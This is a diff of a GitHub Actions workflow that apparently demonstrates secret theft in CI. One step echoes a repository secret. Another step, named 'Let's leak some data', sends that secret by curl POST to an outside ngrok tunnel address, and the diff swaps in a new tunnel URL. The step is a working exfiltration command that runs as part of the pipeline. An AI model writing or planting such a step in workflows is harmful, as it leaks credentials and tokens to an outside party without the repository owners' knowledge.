@@ -26,4 +26,4 @@ jobs:
         run: echo ${{ secrets.FAVOURITE }}
 
       - name: Let's leak some data
-        run: curl -X POST -d '${{ secrets.FAVOURITE }}' https://2e3c-172-211-30-5.ngrok-free.app
+        run: curl -X POST -d '${{ secrets.FAVOURITE }}'https://e2c8-128-131-202-121.ngrok-free.app/
